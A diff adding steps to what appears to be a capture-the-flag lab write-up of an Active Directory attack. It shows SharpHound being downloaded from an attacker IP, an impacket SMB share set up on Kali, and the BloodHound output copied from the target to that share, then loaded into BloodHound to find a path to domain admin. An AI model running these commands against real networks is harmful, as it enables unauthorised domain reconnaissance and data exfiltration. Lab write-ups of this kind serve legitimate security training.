@@ -173,5 +173,35 @@ Invoke-WebRequest "http://10.10.14.184:8877/SharpHound.exe" -OutFile "sharp.exe"
 
 Now to get the files back for bloodhound
 
+Setup an smb share on kali
+
+```
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py MYSHARE ~/forest -smb2support -username haxors -password haxors
+```
+Auth
+```
+net use \\10.10.14.184\MYSHARE /u:"haxors" "haxors"
+```
+Copy the file across
+```
+copy 20210702093445_BloodHound.zip \\10.10.14.184\MYSHARE
+```
+Remove the smb share
+```
+net use /d \\10.10.14.184\MYSHARE
+```
+
+Now login to bloodhound gui (or use sudo apt-get install bloodhound)  
+Click the upload data buttonv
+
+![image](https://user-images.githubusercontent.com/5285547/124308285-ffce8500-db60-11eb-8f78-a21fc2fd71c1.png)
+
+Once the data is uploaded click the "find shortest path to domain admin"  
+
+![image](https://user-images.githubusercontent.com/5285547/124308486-415f3000-db61-11eb-9bab-a750285bea94.png)
+
+![image](https://user-images.githubusercontent.com/5285547/124308680-8b481600-db61-11eb-939d-573b9d1770d2.png)
+ 
+
 
 
